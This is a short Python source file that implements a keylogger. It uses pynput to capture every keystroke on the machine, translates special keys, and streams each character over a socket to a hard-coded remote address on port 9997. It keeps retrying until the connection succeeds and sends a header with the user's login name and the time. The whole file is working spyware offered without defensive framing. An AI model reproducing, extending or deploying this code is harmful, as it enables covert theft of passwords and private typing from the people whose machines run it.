""" stores keystrokes in txt file
Listeners require memory allocation
'with' keyword releases memory automatically? """
import sys
import os
import socket
import time
from datetime import datetime
from pynput.keyboard import Listener


HOST = "192.168.0.58"
PORT = 9997
NAME = str(os.getlogin())
DTT = datetime.now().strftime("%Y-%m-%d-%H:%M:%S")



def write_to_file(key):
    """ writes key to file and cases out exceptions """
    character = str(key)
    character = character.replace("'", "")
    if len(character) == 1:
        pass
    if character == "Key.space":
        character = " "
    elif character == "Key.enter":
        character = "\n"
    elif character == "Key.shift_r" or character == "Key.shift_l" or character == "Key.shift":
        character = ""
    elif character == "Key.ctrl_l" or character == "Key.ctrl_r" or character == "Key.ctrl":
    #    character = "ctrl+"
        character = "^"
    elif character == "Key.backspace":
        character = "-"
    elif character == "Key.tab":
        character = "(tab)"
    elif character == "Key.up":
    #    character = "(up)"
        character = ""
    elif character == "Key.down":
    #    character = "(down)"
        character = ""
    elif character == "Key.left":
    #    character = "(left)"
        character = ""
    elif character == "Key.right":
    #    character = "(right)"
        character = ""
    elif character == "Key.caps_lock":
        character = ""
    elif character == "Key.esc":
        character = "(esc)"
    elif character == "Key.alt" or character == "key.alt_l" or character == "key.alt_r":
        character = "alt+"
    #elif character == "Key.insert":
    #    character = "(insert)"
    elif character == "Key.delete":
    #    character = "(del)"
        character = ""


    if sys.platform == 'linux':
        path = f"/home/{NAME}/.tmp/"
        if not os.path.isdir(path):
            os.makedirs(path)

    #if sys.platform == 'win32' or sys.platform == 'win64':
    #    path = f"C:/Users/{NAME}/.tmp"
    #    if not os.path.isdir(path):
    #        os.makedirs(path)
    SOCK.send(str.encode(character))
    #with open("./log.txt", "a") as file:
    #    file.write(character)

SOCK = socket.socket()
def try_connection():
    """ Tries connection to server in case of connection refused until success. """
    while True:
        try:
            SOCK.connect((HOST, PORT))
            break
        except ConnectionRefusedError:
            time.sleep(5)

try_connection()
SOCK.send(str.encode(f"\nLogs for {NAME} on " + DTT + "\n"))

with Listener(on_press=write_to_file) as l:
    l.join()
